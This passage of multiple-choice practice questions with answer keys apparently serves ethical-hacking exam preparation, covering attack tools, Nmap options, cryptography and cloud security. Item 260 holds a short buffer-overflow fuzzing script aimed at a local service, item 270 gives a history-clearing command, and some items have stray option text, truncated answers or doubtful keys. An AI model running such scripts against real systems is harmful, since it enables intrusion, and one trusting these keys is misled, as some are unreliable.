    "question": "Adam is a shopaholic, and he constantly surfs on the Internet in search of discounted products. The hacker decided to take advantage of this weakness of Adam and sent a fake email containing a deceptive page link to his social media page with information about a sale. Adam anticipating the benefit didn't notice the malicious link, clicked on them and logged in to that page using his valid credentials. Which of the following tools did the hacker probably use?",
    "answers": [
      "PyLoris",
      "XOIC",
      "Evilginx",
      "sixnet-tools"
    ],
    "correct": "Evilginx"
  },
  {
    "id": 256,
    "question": "Which of the following parameters is Nmap helps evade IDS or firewalls?",
    "answers": [
      "-A",
      "-R",
      "-r",
      "-T"
    ],
    "correct": "-T"
  },
  {
    "id": 257,
    "question": "Whois services allow you to get a massive amount of valuable information at the stage of reconnaissance. Depending on the target's location, they receive data from one of the five largest regional Internet registries (RIR). Which of the following RIRs should the Whois service contact if you want to get information about an IP address registered in France?",
    "answers": [
      "LACNIC",
      "ARIN",
      "APNIC",
      "RIPE NCC"
    ],
    "correct": "RIPE NCC"
  },
  {
    "id": 258,
    "question": "Are you sure your network is perfectly protected and no evil hacker Ivan listens to all your traffic? What, ignorance is the greatest source of happiness. There is a powerful tool written in Go that will allow an attacker to carry out a Man in the middle (MITM) attack using, for example, ordinary arp spoofing. What kind of tool are we talking about?",
    "answers": [
      "BetterCAP",
      "DerpNSpoof",
      "Gobbler",
      "Wireshark"
    ],
    "correct": "BetterCAP"
  },
  {
    "id": 259,
    "question": "Which antenna is commonly used in communications for a frequency band of 10 MHz to VHF and UHF?",
    "answers": [
      "Yagi antenna",
      "Parabolic grid antenna",
      "Dipole antenna",
      "Omnidirectional antenna"
    ],
    "correct": "Yagi antenna"
  },
  {
    "id": 260,
"question": "Identify what the following code is used for:\n#!/usr/bin/python\nimport socket\n\nbuffer=[\"A\"]\ncounter=50\n\nwhile len(buffer)<=100:\n&nbsp;&nbsp;&nbsp;&nbsp;buffer.append(\"A\"*counter)\n&nbsp;&nbsp;&nbsp;&nbsp;counter+=50\n\ncommands=[\"HELP\",\"STATS.\",\"RTIME.\",\"LTIME.\",\"SRUN.\",\"TRUN.\",\"GMON.\",\"GDOG.\",\"KSTET.\",\"GTER.\",\"HTER.\",\"LTER.\",\"KSTAN.\"]\n\nfor command in commands:\n&nbsp;&nbsp;&nbsp;&nbsp;for buffstring in buffer:\n&nbsp;&nbsp;&nbsp;&nbsp;print \"Exploiting\"+command+\":\"+str(len(buffstring))\n&nbsp;&nbsp;&nbsp;&nbsp;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n&nbsp;&nbsp;&nbsp;&nbsp;s.connect(('127.0.0.1',9999))\n&nbsp;&nbsp;&nbsp;&nbsp;s.recv(50)\n&nbsp;&nbsp;&nbsp;&nbsp;s.send(command+buffstring)\n&nbsp;&nbsp;&nbsp;&nbsp;s.close()",
    "answers": [
      "Heap spraying",
      "Brute-force",
      "Buffer Overflow",
      "Buffer over-read"
    ],
    "correct": "Buffer Overflow"
  },
  {
    "id": 261,
    "question": "The network administrator has received the task to eliminate all unencrypted traffic inside the company's network. During the analysis, it detected unencrypted traffic in port UDP 161. Which of the following protocols uses this port and what actions should the network administrator take to fix this problem?",
    "answers": [
      "SNMP and he should change it to SNMP V2.",
      "SNMP and he should change it to SNMP V3.",
      "CMIP and enable the encryption for CMIP.",
      "RPC and the best practice is to disable RPC completely."
    ],
    "correct": "SNMP and he should change it to SNMP V3."
  },
  {
    "id": 262,
    "question": "WPS is a rather troubled wireless network security standard. While it can make your life easier, it is also vulnerable to attacks. An attacker within radio range can brute-force the WPS PIN for a vulnerable access point, obtain WEP or WPA passwords, and likely gain access to the Wi-Fi network. However, first, the attacker needs to find a vulnerable point. Which of the following tools is capable of determining WPS-enabled access points?",
    "answers": [
      "wash",
      "ntptrace",
      "net view",
      "macof"
    ],
    "correct": "wash"
  },
  {
    "id": 263,
    "question": "Which term from the following describes a set of vulnerabilities that allows spyware to be installed on smartphones with the iOS operating system, allowing those who conducted espionage to track and monitor every action on the device?",
    "answers": [
      "DroidSheep",
      "Trident",
      "Androrat",
      "Zscaler"
    ],
    "correct": "Trident"
  },
  {
    "id": 264,
    "question": "Identify the correct sequence of steps involved in the vulnerability-management life cycle.",
    "answers": [
      "Remediation -> Monitor -> Verification -> Vulnerability scan -> Risk assessment -> Identify assets and create a baseline.",
      "Vulnerability scan -> Risk assessment -> Identify assets and create a baseline -> Remediation -> Monitor -> Verification.",
      "Identify assets and create a baseline -> Vulnerability scan -> Risk assessment -> Remediation -> Verification -> Monitor.",
      "Vulnerability scan -> Identify assets and create a baseline -> Risk assessment -> Remediation -> Verification -> Monitor."
    ],
    "correct": "Identify assets and create a baseline -> Vulnerability scan -> Risk assessment -> Remediation -> Verification -> Monitor."
    },
    {
    "id": 265,
    "question": "The date and time of the remote host can theoretically be used against some systems to use weak time-based random number generators in other services. Which option in Zenmap will allow you to make ICMP Timestamp ping?",
    "answers": [
      "-PU",
      "-PP",
      "-PY",
      "-PN"
    ],
    "correct": "-PP"
  },
  {
    "id": 266,
    "question": "Which of the following is an anonymizer that masks real IP addresses and ensures complete and continuous anonymity for all online activities?",
    "answers": [
      "https://www.baidu.com",
      "https://karmadecay.com",
      "https://www.wolframalpha.com",
      "https://www.guardster.com"
    ],
    "correct": "https://www.guardster.com"
  },
  {
    "id": 267,
    "question": "Identify the encryption algorithm by the description: Symmetric-key block cipher having a classical 12- or 16-round Feistel network with a block size of 64 bits for encryption, which includes large 8 \u00d7 32-bit S-boxes based on bent functions, modular addition and subtraction, key-dependent rotation, and XOR operations. This cipher also uses a \"masking\" key and a \"rotation\" key for performing its functions.",
    "answers": [
      "GOST",
      "AES",
      "DES",
      "CAST-128"
    ],
    "correct": "CAST-128"
  },
  {
    "id": 268,
    "question": "The attacker needs to collect information about his victim - Maria. She is an extrovert who often posts a large amount of private information, photos, and location tags of recently visited places on social networks. Which automated tool should an attacker use to gather information to perform other sophisticated attacks?",
    "answers": [
      "Ophcrack",
      "Hootsuite",
      "VisualRoute",
      "HULK"
    ],
    "correct": "Hootsuite"
  },
  {
    "id": 269,
    "question": "Which of the following is a cloud malware designed to exploit misconfigured kubelets in a Kubernetes cluster and infect all containers present in the Kubernetes environment?",
    "answers": [
      "Heartbleed",
      "Hildegard",
      "Kubescape",
      "Trivy",
      "Container Image",
      "Filesystem",
      "Git repository (remote)",
      "Kubernetes cluster or resource"
    ],
    "correct": "Hildegard"
  },
  {
    "id": 270,
    "question": "Which of the following commands is used to clear the bash history?",
    "answers": [
      "history \u2013c",
      "history \u2013n",
      "history -w",
      "history \u2013a"
    ],
    "correct": "history \u2013c"
  },
  {
    "id": 271,
    "question": "The attacker disabled the security controls of NetNTLMv1 by modifying the values of LMCompatibilityLevel, NTLMMinClientSec, and RestrictSendingNTLMTraffic. His next step was to extract all the non-network logon tokens from all the active processes to masquerade as a legitimate user to launch further attacks. Which of the following attacks was performed by the attacker?",
    "answers": [
      "Rainbow table attack",
      "Internal monologue attack",
      "Dictionary attack",
      "Phishing attack"
    ],
    "correct": "Internal monologue attack"
  },
  {
    "id": 272,
    "question": "Ivan, a black hat hacker, got the username from the target environment. In conditions of limited time, he decides to use a list of common passwords, which he will pass as an argument to the hacking tool. Which of the following is the method of attack that Ivan uses?",
    "answers": [
      "Smudge attack.",
      "Known plaintext attack.",
      "Dictionary attack.",
      "Password spraying attack."
    ],
    "correct": "Dictionary attack."
  },
  {
    "id": 273,
    "question": "Which of the following is a rootkit that adds additional code or replaces portions of the core operating system to obscure a backdoor on a system?",
    "answers": [
      "Application-level Rootkit.",
      "Hypervisor-level rootkit.",
      "Kernel-level rootkit.",
      "User-mode rootkit."
    ],
    "correct": "Kernel-level rootkit."
  },
  {
    "id": 274,
    "question": "Which of the following types of attack does the use of Wi-Fi Pineapple belong to run an access point with a legitimate-looking SSID for a nearby business?",
    "answers": [
      "Phishing attack",
      "Wardriving attack",
      "MAC spoofing attack",
      "Evil-twin attack"
    ],
    "correct": "Evil-twin attack"
  },
  {
    "id": 275,
    "question": "Which of the following USB tools using to copy files from USB devices silently?",
    "answers": [
      "USBDumper",
      "USBGrabber",
      "USBSniffer",
      "USBSnoopy"
    ],
    "correct": "USBDumper"
  },
  {
    "id": 276,
    "question": "Which of the following SOAP extensions apply security to Web services and maintain the integrity and confidentiality of messages?",
    "answers": [
      "WSDL",
      "WS-Policy",
      "WS-BPEL",
      "WS-Security"
    ],
    "correct": "WS-Security"
  },
  {
    "id": 277,
    "question": "What is the \"wget 192.168.0.10 -q -S\" command used for?",
    "answers": [
      "Download all the contents of the web page locally.",
      "Using wget to perform banner grabbing on the webserver.",
      "Performing content enumeration on the web server to discover hidden folders.",
      "Flooding the web server with requests to perform a DoS attack."
    ],
    "correct": "Using wget to perform banner grabbing on the webserver."
  },
  {
    "id": 278,
    "question": "Lisandro was hired to steal critical business documents of a competitor company. Using a vulnerability in over-the-air programming (OTA programming) on Android smartphones, he sends messages to company employees on behalf of the network operator, asking them to enter a PIN code and accept new updates for the phone. After the employee enters the PIN code, Lisandro gets the opportunity to intercept all Internet traffic from the phone. What type of attack did Lisandro use?",
    "answers": [
      "Tap 'n ghost attack.",
      "Bypass SSL pinning.",
      "Social engineering.",
      "Advanced SMS phishing."
    ],
    "correct": "Advanced SMS phishing."
  },
  {
    "id": 279,
    "question": "Identify the security model by description: In this security model, every user in the network maintains a ring of public keys. Also, a user needs to encrypt a message using the receiver\u2019s public key, and only the receiver can decrypt the message using their private key.",
    "answers": [
      "Secure Socket Layer",
      "Zero trust security model",
      "Transport Layer Security",
      "Web of trust"
    ],
    "correct": "Web of trust"
  },
  {
    "id": 280,
    "question": "The attacker wants to draw a map of the target organization's network infrastructure to know about the actual environment they will hack. Which of the following will allow him to do this?",
    "answers": [
      "Vulnerability analysis",
      "Scanning networks",
      "Malware analysis",
      "Network enumeration"
    ],
    "correct": "Scanning networks"
  },
  {
    "id": 281,
    "question": "Storing cryptographic keys carries a particular risk. In cryptography, there is a mechanism in which a third party stores copies of private keys. By using it, you are can ensure that in the case of a catastrophe, be it a security breach, lost or forgotten keys, natural disaster, or otherwise, your critical keys are safe. What is the name of this mechanism?",
    "answers": [
      "Key schedule",
      "Key whitening",
      "Key encapsulation",
      "Key escrow"
    ],
    "correct": "Key escrow"
  },
  {
    "id": 282,
    "question": "Black-hat hacker Ivan attacked a large DNS server. By poisoning the cache, he was able to redirect the online store's traffic to a phishing site. Users did not notice the problem and believed that they were on the store's actual website, so they entered the data of their accounts and even bank cards. Before the security system had time to react, Ivan collected a large amount of critical user data. Which option is best suited to describe this attack?",
    "answers": [
      "Spear-phishing",
      "Pharming",
      "SPIT attack",
      "Phishing"
    ],
    "correct": "Pharming"
  },
  {
    "id": 283,
    "question": "Which of the following is an example of a scareware social engineering attack?",
    "answers": [
      "A pop-up appears to a user stating, \"Your computer may have been infected with spyware. Click here to install an anti-spyware tool to resolve this issue.\"",
      "A pop-up appears to a user stating, \"You have won money! Click here to claim your prize!\"",
      "A banner appears to a user stating, \"Your order has been delayed. Click here to find out your new delivery date.\"",
      "A banner appears to a user stating, \"Your password has expired. Click here to update your password.\""
    ],
    "correct": "A pop-up appears to a user stating, \"Your computer may have been infected"
  },
  {
    "id": 284,
    "question": "What is the name of a cloud infrastructure in which multiple organizations share resources and services based on common operational and regulatory requirements?",
    "answers": [
      "Community Cloud",
      "Hybrid Cloud",
      "Public Cloud",
      "Shared Cloud"
    ],
    "correct": "Community Cloud"
  },
  {
    "id": 285,
    "question": "When scanning with Nmap, you found a firewall. Now you need to determine whether it is a stateful or stateless firewall. Which of the following options is best for you to use?",
    "answers": [
      "-sM",
      "-sT",
      "-sA",
      "-sO"
    ],
    "correct": "-sA"
  },
  {
    "id": 286,
    "question": "Alex was assigned to perform a penetration test against a website using Google dorks. He needs to get results with file extensions. Which operator should Alex use to achieve the desired result?",
    "answers": [
      "site:",
      "filetype:",
      "define:",
      "inurl:"
    ],
    "correct": "filetype:"
  },
  {
    "id": 287,
    "question": "Incorrectly configured S3 buckets are among the most common and widely targeted attack vectors. All it takes is one or two clicks to upload sensitive data to the wrong bucket or change permissions on a bucket from private to public. Which one of the following tools can you use to enumerate bucket permissions?",
    "answers": [
      "DumpsterDiver",
      "Sysdig",
      "Ruler",
      "S3 Inspector",
      "Checks all your buckets for public access",
      "For every bucket gives you the report with:",
      "Indicator if your bucket is public or not",
      "Permissions for your bucket if it is public",
      "List of URLs to access your bucket (non-public buckets will return Access"
    ],
    "correct": "S3 Inspector"
  },
  {
    "id": 288,
    "question": "Which of the following is a Metasploit post-exploitation module that is used to escalate privileges on systems?",
    "answers": [
      "autoroute",
      "getuid",
      "getsystem",
      "keylogrecorder"
    ],
    "correct": "getsystem"
  },
  {
    "id": 289,
    "question": "Such techniques as, for example, password cracking or enumeration are much more efficient and faster if performed using a wordlist. Of course, there are a huge number of them in different directions on the Internet or already installed in your Kali or Parrot OS, but an attacker can create his wordlist specifically for the target he is attacking. This requires conducting intelligence and collecting information about the victim. Many tools allow you to automate this process. Which of the following tools can scan a website and create a wordlist?",
    "answers": [
      "Psiphon",
      "Shadowsocks",
      "Orbot",
      "CeWL"
    ],
    "correct": "CeWL"
  },
  {
    "id": 290,
    "question": "Assume you used Nmap, and after applying a command, you got the following output:  Starting Nmap X.XX (http://nmap.org) at XXX-XX-XX XX:XX EDT  Nmap scan report for 192.168.1.42 Host is up (0.00023s latency).  Not shown: 932 filtered ports, 56 closed ports    PORT STATE SERVICE -  21/Rep open ftp  22/tcp open ssh  25/tcp open smtp  53/tcp open domain  80/tcp open http  110/tcp open pop3  143/tcp open imap  443/tcp open https  465/tcp open smtps  587/tcp open submission  993/tcp open imaps  995/tcp open pop3s  Nmap done: 1 IP address (1 host up) scanned in 3.90 seconds Which of the following command-line parameter could you use to determine the service protocol, the application name, the version number, hostname, device type?",
    "answers": [
      "-sY",
      "-sS",
      "-sV",
      "-sT"
    ],
    "correct": "-sV"
  },
  {
    "id": 291,
    "question": "Scammers can query the DNS server to determine whether a specific DNS record is cached, thereby determining your organization\u2019s browsing habits. This can disclose sensitive information such as financial institutions visited recently or other sensitive websites that a company might not want to be public knowledge of. Which of the proposed attacks fits this description?",
    "answers": [
      "DNS cache snooping",
      "DNS zone walking",
      "DNS cache poisoning",
      "DNSSEC zone walking"
    ],
    "correct": "DNS cache snooping"
  },
  {
    "id": 292,
    "question": "Ivan, the black hat hacker, plugged in a rogue switch to an unused port in the LAN with a priority lower than any other switch in the network so that he could make it a root bridge that will later allow him to sniff all the traffic in the target's network. What attack did Ivan perform?",
    "answers": [
      "STP attack.",
      "DNS poisoning.",
      "VLAN hopping.",
      "ARP spoofing."
    ],
    "correct": "STP attack."
  },
  {
    "id": 293,
    "question": "Ivan, a black hacker, wants to get information about IoT cameras and devices used by the attacked company. For these purposes, he will use a tool that collects information about the IoT devices connected to a network, open ports and services, and the attack surface area. Thanks to this tool, Ivan constantly monitors every available server and device on the internet. This opportunity will allow him to exploit these devices in the future. Which of the following tools did Ivan use to carry out this attack?",
    "answers": [
      "NeuVector",
      "Censys",
      "Wapiti",
      "Lacework"
    ],
    "correct": "Censys"
  },
  {
    "id": 294,
    "question": "Jonathan, the evil hacker, wants to capture all the data transmitted over a network and perform expert analysis of each part of the target network. Which of the following tools will help him execute this attack?",
    "answers": [
      "Spoof-Me-Now",
      "arpspoof",
      "OmniPeek",
      "ike-scan"
    ],
    "correct": "OmniPeek"
  },
  {
    "id": 295,
    "question": "Rajesh wants to make the Internet a little safer and uses his skills to scan the networks of various organizations and find vulnerabilities even without the owners' permission. He informs the company owner about the problems encountered, but if the company ignores him and does not fix the vulnerabilities, Rajesh publishes them publicly and forces the company to respond. What type of hacker is best suited for Rajesh?",
    "answers": [
      "Black hat",
      "Cybercriminal",
      "Gray hat",
      "White hat"
    ],
    "correct": "Gray hat"
  },
  {
    "id": 296,
    "question": "Which of the following services is running on port 21 by default?",
    "answers": [
      "Service Location Protocol",
      "Domain Name System",
      "Border Gateway Protocol",
      "File Transfer Protocol"
    ],
    "correct": "File Transfer Protocol"
  },
  {
    "id": 297,
    "question": "Evil hacker Ivan knows that his target point and user are compatible with WPA2 and WPA 3 encryption mechanisms. He decided to install a rogue access point with only WPA2 compatibility in the vicinity and forced the victim to go through the WPA2 four- way handshake to connect. As soon as the connection is established, Ivan plans to use automated tools to crack WPA2-encrypted messages. Which of the following attacks does Ivan want to perform?",
    "answers": [
      "Side-channel attack",
      "Downgrade security attack",
      "Timing-based attack",
      "Cache-based attack"
    ],
    "correct": "Downgrade security attack"
  },
  {
    "id": 298,
    "question": "Identify the type of SQL injection where attacks extend the results returned by the original query, enabling attackers to run two or more statements if they have the same structure as the original one?",
    "answers": [
      "Error-based SQL Injection",
      "Blind SQL Injection",
      "Union SQL injection"
    ],
    "correct": "Union SQL injection"
  },
  {
    "id": 299,
    "question": "The company hired a cybersecurity specialist to conduct an audit of their mobile application. On the first day of work, the specialist suggested starting with the fact that he would extract the source code of a mobile application and disassemble the application to analyze its design flaws. He is sure that using this technique, he can fix bugs in the application, discover underlying vulnerabilities, and improve defence strategies against attacks. Which of the following techniques will the specialist use?",
    "answers": [
      "Application sandboxing.",
      "Reverse engineering.",
      "Jailbreaking.",
      "Rooting."
    ],
    "correct": "Reverse engineering."
  },
  {
    "id": 300,
    "question": "During the pentest, Maria, the head of the blue team, discovered that the new online service has problems with the authentication mechanism. The old password can be reset by correctly answering the secret question, and the sending form does not have protection using a CAPTCHA, which allows a potential attacker to use a brute force attack. What is the name of such an attack in the Enumeration of Common Disadvantages (CWE)?",
    "answers": [
      "Insecure transmission of credentials.",
      "Weak password recovery mechanism.",
      "Verbose failure messages.",
      "User impersonation."
    ],
    "correct": "Weak password recovery mechanism."
  },
  {
    "id": 301,
    "question": "The attacker gained credentials of an organization's internal server system and often logged in outside work hours. The organization commissioned the cybersecurity department to analyze the compromised device to find incident details such as the type of attack, its severity, target, impact, method of propagation, and vulnerabilities exploited. What is the incident handling and response process, in which the cybersecurity department has determined these issues?",
    "answers": [
      "Incident triage.",
      "Eradication.",
      "Preparation.",
      "Incident recording and assignment."
    ],
    "correct": "Incident triage."
  },
  {
    "id": 302,
    "question": "In which of the following cloud service models do you take full responsibility for the maintenance of the cloud-based resources?",
    "answers": [
      "IaaS",
      "SaaS",
      "BaaS",
      "PaaS"
    ],
    "correct": "IaaS"
  },
  {
    "id": 303,
    "question": "Identify the type of SQLi by description: This type of SQLi doesn't show any error message. Its use may be problematic due to as it returns information when the application is given SQL payloads that elicit a true or false response from the server. When the attacker uses this method, an attacker can extract confidential information by observing the responses.",
    "answers": [
      "Out-of-band SQLi",
      "Blind SQLi",
      "Error-based SQLi",
      "Union SQLi"
    ],
    "correct": "Blind SQLi"
  },
  {
    "id": 304,
    "question": "The boss has instructed you to test the company's network from the attacker's point of view to find out what exploits and vulnerabilities are accessible to the outside world by using devices such as firewalls, routers, and servers. During this process, you should also external assessment estimates the threat of network security attacks external to the organization. What type of vulnerability assessment should you perform?",
    "answers": [
      "External assessment",
      "Host-based Assessments",
      "Active Assessments",
      "Passive assessment"
    ],
    "correct": "External assessment"
  },
  {
    "id": 305,
    "question": "Which of the following is a network forensics analysis tool that can monitor and extract information from network traffic and capture application data contained in the network traffic?",
    "answers": [
      "mitm6",
      "yersinia",
      "Hyenae NG",
      "Xplico"
    ],
    "correct": "Xplico"
  },
  {
    "id": 306,
    "question": "Andrew, an evil hacker, research the website of the company which he wants to attack. During the research, he finds a web page and understands that the company's application is potentially vulnerable to Server-side Includes Injection. Which web-page file type did Andrew find while researching the site?",
    "answers": [
      ".stm",
      ".html",
      ".rss",
      ".cms"
    ],
    "correct": ".stm"
  },
  {
    "id": 307,
    "question": "John, a black hacker, is trying to do an SMTP enumeration. What useful information can John gather during a Simple Mail Transfer Protocol enumeration?",
    "answers": [
      "He can receive a list of all mail proxy server addresses used by the company.",
      "He can use the internal command RCPT provides a list of ports open.",
      "He can find information about the daily outgoing message limits before mailboxes are locked.",
      "He can use two internal commands VRFY and EXPN, which provide information about valid users, email addresses, etc."
    ],
    "correct": "He can use two internal commands VRFY and EXPN, which provide information about valid users, email addresses, etc."
  },
  {
    "id": 308,
    "question": "You are investigating to determine the reasons for compromising the computers of your company's employees. You will find out that the machines were infected through sites that employees often visit. When an employee opens a site, there is a redirect from a web page, and malware downloads to the machine. Which of the following attacks did the attacker perform on your company's employees?",
    "answers": [
      "MarioNet",
      "Clickjacking",
      "DNS rebinding",
      "Watering hole"
    ],
    "correct": "Watering hole"
  },
  {
    "id": 309,
    "question": "Your company plans to open a new division. You have been assigned to choose a cloud deployment model. The main requirements for the cloud model are infrastructure operated solely for your organization with the ability to customize hardware, network, and storage characteristics. Which of the following solutions will suit your organization?",
    "answers": [
      "Hybrid cloud",
      "Private cloud",
      "Community cloud",
      "Public cloud",
    ],
    "correct": "Private cloud"
  },
  {
    "id": 310,
    "question": "Which of the scenarios corresponds to the behaviour of the attacker from the example below: The attacker created and configured multiple domains pointing to the same host to switch quickly between the domains and avoid detection.",
    "answers": [
      "Data staging.",
      "DNS tunnelling.",
      "Unspecified proxy activities.",
      "Use of command-line interface."
    ],
    "correct": "Unspecified proxy activities."
  },
  {
    "id": 311,
    "question": "Which of the following is the fastest way to perform content enumeration on a web server using the Gobuster tool?",
    "answers": [
      "Skipping SSL certificate verification.",
      "Performing content enumeration using the brute-force mode and 10 threads.",
      "Performing content enumeration using a wordlist.",
      "Performing content enumeration using the brute-force mode and random file extensions."
    ],
    "correct": "Performing content enumeration using a wordlist."
  },
  {
    "id": 312,
    "question": "Which of the following is the best description of The final phase of every successful hacking - Clearing tracks?",
    "answers": [
      "After a system is breached, a hacker creates a backdoor.",
      "During a cyberattack, a hacker corrupts the event logs on all machines.",
      "During a cyberattack, a hacker injects a rootkit into a server.",
      "A hacker gains access to a server through an exploitable vulnerability."
    ],
    "correct": "During a cyberattack, a hacker corrupts the event logs on all machines."
  },
  {
    "id": 313,
    "question": "To collect detailed information about services and applications running on identified open ports, nmap can perform version detection. To do this, various probes are used to receive responses from services and applications. Nmap requests probe information from the target host and analyzes the response, comparing it with known responses for various services, applications, and versions. Which of the options will allow you to run this scan?",
    "answers": [
      "-sX",
      "-sF",
      "-sV",
      "-sN"
    ],
    "correct": "-sV"
  },
  {
    "id": 314,
    "question": "Which of the following is a Docker network plugin designed for building security and infrastructure policies for multi-tenant microservices deployments?",
    "answers": [
      "Weave",
      "Macvlan",
      "Kuryr",
      "Contiv"
    ],
    "correct": "Contiv"
  },
  {
    "id": 315,
    "question": "You need to increase the security of keys used for encryption and authentication. For these purposes, you decide to use a technique to enter an initial key to an algorithm that generates an enhanced key resistant to brute-force attacks. Which of the following techniques will you use?",
    "answers": [
      "Key stretching",
      "PKI",
      "KDF",
      "Key reinstallation"
    ],
    "correct": "Key stretching"
  },
  {
    "id": 316,
    "question": "Which of the following algorithms is a symmetric key block cipher with a block size of 128 bits representing a 32-round SP-network operating on a block of four 32-bit words?",
    "answers": [
      "CAST-128",
      "SHA-256",
      "RC4",
      "Serpent"
    ],
    "correct": "Serpent"
  },
  {
    "id": 317,
    "question": "Which of the following is an on-premise or cloud-hosted solution responsible for enforcing security, compliance, and governance policies in the cloud application?",
    "answers": [
      "Next-Generation Secure Web Gateway",
      "Container Security Tools",
      "Cloud Access Security Broker",
      "Secure access service edge"
    ],
    "correct": "Cloud Access Security Broker"
  },
  {
    "id": 318,
    "question": "The company \"Work Town\" hired a cybersecurity specialist to perform a vulnerability scan by sniffing the traffic on the network to identify the active systems, network services, applications, and vulnerabilities. What type of vulnerability assessment should be performed for \"Work Town\"?",
    "answers": [
      "External assessment.",
      "Internal assessment.",
      "Passive assessment.",
      "Active assessment."
    ],
    "correct": "Passive assessment."
  },
  {
    "id": 319,
    "question": "Black-hat hacker Ivan attacked the SCADA system of the industrial water facility. During the exploration process, he discovered that outdated equipment was being used, the human-machine interface (HMI) was directly connected to the Internet and did not have any security tools or authentication mechanism. This allowed Ivan to control the system and influence all processes (including water pressure and temperature). What category does this vulnerability belong to?",
    "answers": [
      "Memory Corruption.",
      "Lack of Authorization/Authentication and Insecure Defaults.",
      "Code Injection.",
      "Credential Management."
    ],
    "correct": "Lack of Authorization/Authentication and Insecure Defaults."
  },
  {
    "id": 320,
    "question": "Modern security mechanisms can stop various types of DDoS attacks, but if they only check incoming traffic and mostly ignore return traffic, attackers can bypass them under the disguise of a valid TCP session by carrying an SYN, multiple ACK, and one or more RST or FIN packets. What is the name of such an attack?",
    "answers": [
      "Spoofed session flood attack.",
      "UDP flood attack.",
      "Peer-to-peer attack.",
      "Ping-of-death attack."
    ],
    "correct": "Spoofed session flood attack."
  },
  {
    "id": 321,
    "question": "You have been instructed to organize the possibility of working remotely for employees. Their remote connections could be exposed to session hijacking during the work, and you want to prevent this possibility. You decide to use the technology that creates a safe and encrypted tunnel over a public network to securely send and receive sensitive information and prevent hackers from decrypting the data flow between the endpoints. Which of the following technologies will you use?",
    "answers": [
      "VPN",
      "Bastion host",
      "DMZ",
      "Split tunneling"
    ],
    "correct": "VPN"
  },
  {
    "id": 322,
    "question": "Identify the technology according to the description: It's an open-source technology that can help in developing, packaging, and running applications. Also, the technology provides PaaS through OS-level virtualization, delivers containerized software packages, and promotes fast software delivery. This technology can isolate applications from the underlying infrastructure and stimulating communication via well-defined channels.",
    "answers": [
      "Virtual machine",
      "Docker",
      "Serverless computing",
      "Paravirtualization"
    ],
    "correct": "Docker"
  },
  {
    "id": 323,
    "question": "In which of the following attacks does the attacker receive information from data sources such as voice assistants, multimedia messages, and audio files by using a malicious app to breach speech privacy?",
    "answers": [
      "DroidDream",
      "Smudge attack",
      "Spearphone attack",
      "SIM swap scam"
    ],
    "correct": "Spearphone attack"
  },
  {
    "id": 324,
    "question": "Which of the following is a Mirai-based botnet created by threat group Keksec, which specializes in crypto mining and DDoS attacks?",
    "answers": [
      "Enemybot",
      "BlueBorne",
      "SeaCat",
      "Censys"
    ],
    "correct": "Enemybot"
  },
  {
    "id": 325,
    "question": "Which of the following is a Kubernetes component that can assign nodes based on the overall resource requirement, data locality, software/hardware/policy restrictions, and internal workload interventions?",
    "answers": [
      "Kube-controller-manager",
      "cloud-controller-manager",
      "Kube-apiserver",
      "Kube-scheduler"
    ],
    "correct": "Kube-scheduler"
  },
  {
    "id": 326,
    "question": "John sends an email to his colleague Angela and wants to ensure that the message will not be changed during the delivery process. He creates a checksum of the message and encrypts it using asymmetric cryptography. What key did John use to encrypt the checksum?",
    "answers": [
      "His own private key.",
      "Angela's private key",
      "His own public key.",
      "Angela's public key."
    ],
    "correct": "Angela's public key."
  },
  {
    "id": 327,
    "question": "John, a black hat hacker, wants to find out if there are honeypots in the system that he will attack. For this purpose, he will use a time-based TCP fingerprinting method to validate the response to a computer and the response of a honeypot to a manual SYN request. Identify which of the following techniques will John use?",
    "answers": [
      "Detecting the presence of UML Honeypot.",
      "Detecting the presence of Sebek-based honeypots.",
      "Detecting the presence of Honeyd honeypots.",
      "Detecting the presence of Snort_inline honeypots."
    ],
    "correct": "Detecting the presence of Honeyd honeypots."
  },
  {
    "id": 328,
    "question": "Jack, a cybersecurity specialist, plans to do some security research for the embedded hardware he uses. He wants to perform side-channel power analysis and glitching attacks during this research. Which of the following will Jack use?",
    "answers": [
      "ChipWhisperer",
      "UART",
      "Foren6",
      "RIoT", 
    ],
    "correct": "ChipWhisperer"
  },
  {
    "id": 329,
    "question": "This attack exploits a vulnerability that provides additional routing information in the SOAP header to support asynchronous communication. Also, it further allows the transmission of web-service requests and response messages using different TCP connections. Which of the following attacks matches the description above?",
    "answers": [
      "WS-Address spoofing",
      "SOAPAction spoofing",
      "XML Flooding",
      "Soap Array Attack"
    ],
    "correct": "WS-Address spoofing"
  },
  {
    "id": 330,
    "question": "Your company started working with a cloud service provider, and after a while, they were disappointed with their service and wanted to move to another CSP. Which of the following can become a problem when changing to a new CSP?",
    "answers": [
      "Lock-down",
      "Lock-up",
      "Lock-in",
      "Virtualization"
    ],
    "correct": "Lock-in"
  },
  {
    "id": 331,
    "question": "Enabling SSI directives allows developers to add dynamic code snippets to static HTML pages without using full-fledged client or server languages. However, suppose the server is incorrectly configured (for example, allowing the exec directive) or the data is not strictly verified. In that case, an attacker can change or enter directives to perform malicious actions. What kind of known attack are we talking about?",
    "answers": [
      "Server-side includes injection",
      "Server-side template injection",
      "CRLF injection",
      "Server-side JS injection"
    ],
    "correct": "Server-side includes injection"
  },
  {
    "id": 332,
    "question": "You need to protect the company's network from imminent threats. To complete this task, you will enter information about threats into the security devices in a digital format to block and identify inbound and outbound malicious traffic entering the company's network. Which of the following types of threat intelligence will you use?",
    "answers": [
      "Tactical threat intelligence.",
      "Strategic threat intelligence.",
      "Operational threat intelligence.",
      "Technical threat intelligence."
    ],
    "correct": "Technical threat intelligence."
  },
  {
    "id": 333,
    "question": "You want to prevent possible SQLi attacks on your site. To do this, you decide to use a practice whereby only a list of entities such as the data type, range, size, and value, which have been approved for secured access, is accepted. Which of the following practices are you going to adopt?",
    "answers": [
      "Output encoding.",
      "Enforce least privileges.",
      "Blacklist validation.",
      "Whitelist validation."
    ],
    "correct": "Whitelist validation."
  },
  {
    "id": 334,
    "question": "The attacker created a fraudulent email with a malicious attachment and sent it to employees of the target organization. The employee opened this email and clicked on the malicious attachment. Because of this, the malware was downloaded and injected into the software used in the victim's system occurred. Further, the malware propagated itself to other networked systems and finally damaging the industrial automation component. Which of the following attack techniques was used by the attacker?",
    "answers": [
      "Reconnaissance attack",
      "SMishing attack",
      "HMI-based attack",
      "Spear-phishing attack"
    ],
    "correct": "Spear-phishing attack"
  },
  {
    "id": 335,
    "question": "Which of the following is a type of malware that spreads from one system to another or from one network to another and causes similar types of damage as viruses to do to the infected system?",
    "answers": [
      "Worm",
